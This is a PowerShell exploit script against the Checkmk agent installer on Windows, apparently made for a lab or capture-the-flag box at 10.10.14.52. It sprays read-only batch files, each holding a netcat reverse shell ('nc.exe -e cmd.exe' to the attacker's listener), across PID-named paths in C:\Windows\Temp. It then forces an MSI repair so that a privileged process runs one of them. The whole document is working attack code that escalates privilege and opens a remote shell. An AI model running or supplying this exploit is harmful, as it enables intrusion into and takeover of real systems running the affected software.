param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.14.52",
    [string]$LPORT = "9001",
    [string]$MsiPath = ""
)

# 1. Define the malicious batch payload
$NcPath = "C:\Temp\nc.exe"
$BatchPayload = "@echo off`r`n`"$NcPath`" -e cmd.exe $LHOST $LPORT"

# 2. Find the MSI trigger - Multiple search methods
if ($MsiPath -and (Test-Path $MsiPath)) {
    Write-Host "[+] Using manually specified MSI: $MsiPath"
    $msi = $MsiPath
}
else {
    Write-Host "[*] Searching for Checkmk MSI in registry..."
    
    # Method 1: Checkmk specific search
    $msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' -ErrorAction SilentlyContinue | 
            Where-Object { $_.DisplayName -like '*Checkmk*' -or $_.DisplayName -like '*check_mk*' } | 
            Select-Object -First 1).LocalPackage

    if (!$msi) {
        Write-Host "[*] Method 1 failed, trying alternative registry locations..."
        
        # Method 2: Search in all products
        $msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
                Where-Object { $_.DisplayName -like '*Checkmk*' -or $_.DisplayName -like '*check_mk*' } |
                Select-Object -First 1).InstallSource
    }

    if (!$msi) {
        Write-Host "[*] Searching for any MSI files in common locations..."
        
        # Method 3: Search for MSI files directly
        $commonPaths = @(
            "C:\Program Files\Checkmk",
            "C:\Program Files (x86)\Checkmk", 
            "C:\Windows\Installer",
            "C:\Windows\Temp",
            "C:\Temp"
        )
        
        foreach ($path in $commonPaths) {
            if (Test-Path $path) {
                $foundMsi = Get-ChildItem -Path $path -Filter "*.msi" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($foundMsi) {
                    $msi = $foundMsi.FullName
                    Write-Host "[+] Found MSI file: $msi"
                    break
                }
            }
        }
    }
}

# Verify MSI exists
if (!$msi -or !(Test-Path $msi)) {
    Write-Host "`n[!] ERROR: Could not find Checkmk MSI file"
    Write-Host "`nDebug information:"
    Write-Host "1. Check if Checkmk is installed on this system"
    Write-Host "2. Try running: Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like '*Checkmk*'}"
    Write-Host "3. Manually search for .msi files in C:\Windows\Installer\"
    Write-Host "4. Use the -MsiPath parameter to specify the MSI path manually"
    Write-Host "`nExample: .\exploit.ps1 -MsiPath 'C:\Windows\Installer\123abc.msi'"
    exit 1
}

Write-Host "[+] Found MSI at: $msi"

# 3. Spray the Read-Only files (FIXED: using $processId instead of $pid)
Write-Host "[*] Seeding files from PID $MinPID to $MaxPID..."
$fileCount = 0

foreach ($ctr in 0..1) {
    for ($processId = $MinPID; $processId -le $MaxPID; $processId++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($processId)_$($ctr).cmd"
        try {
            # Write the payload
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            
            # Set as read-only
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
            $fileCount++
            
            # Progress indicator
            if ($fileCount % 1000 -eq 0) {
                Write-Host "[*] Created $fileCount files so far..."
            }
        } 
        catch {
            # Silent continue on errors
        }
    }
}

Write-Host "[+] Seeding complete. Created approximately $fileCount files in C:\Windows\Temp\"

# 4. Launch the trigger
Write-Host "[*] Triggering MSI repair..."
try {
    Write-Host "[*] Command: msiexec.exe /fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log"
    $process = Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait -PassThru -NoNewWindow
    
    if ($process.ExitCode -eq 0) {
        Write-Host "[+] MSI repair triggered successfully"
    } else {
        Write-Warning "[!] MSI repair completed with exit code: $($process.ExitCode)"
        Write-Host "[*] Check C:\Windows\Temp\cmk_repair.log for details"
    }
}
catch {
    Write-Error "[!] Failed to trigger MSI repair: $($_.Exception.Message)"
}

Write-Host "[*] Exploit completed. Check your listener on $LHOST`:$LPORT"
Write-Host "[*] If no connection, check if nc.exe exists at $NcPath"